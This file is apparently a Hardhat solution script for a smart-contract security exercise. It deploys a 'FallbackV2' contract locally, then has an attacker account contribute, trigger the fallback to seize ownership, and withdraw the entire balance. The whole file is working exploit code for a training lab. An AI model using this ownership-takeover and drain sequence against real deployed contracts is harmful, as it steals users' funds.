import assert from 'assert';
import { ethers } from 'hardhat';

const main = async () => {
  const ContractFactory = await ethers.getContractFactory('FallbackV2');
  const contract = await ContractFactory.deploy();

  await contract.deployed();

  console.log('Contract deployed to:', contract.address);

  const [owner, attacker] = await ethers.getSigners();
  console.log(`Owner address : ${owner.address}`);
  console.log(`Attacker address ${attacker.address}`);

  // 1. Send some ether to contribute()
  await contract.connect(attacker).contribute({ value: 1 });

  // 2. Send transaction the fallback function will make attacker the owner.
  // Fallback function - https://www.geeksforgeeks.org/solidity-fall-back-function/
  await attacker.sendTransaction({
    to: contract.address,
    value: ethers.utils.parseUnits('1', 'wei')
  });

  // 3. Check the owner
  const contractOwner = await contract.owner();
  assert(contractOwner === attacker.address, 'isOwner?');

  // 4. Make withdraw to take all money
  const tx = await contract.connect(attacker).withdraw();
  tx.wait();

  // 5. Verify contract balance is 0
  const balance = await contract.provider.getBalance(contract.address);
  assert(balance.toString() === '0', 'Balance is empty');
  console.log(`Total balance : ${balance}`);
};

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
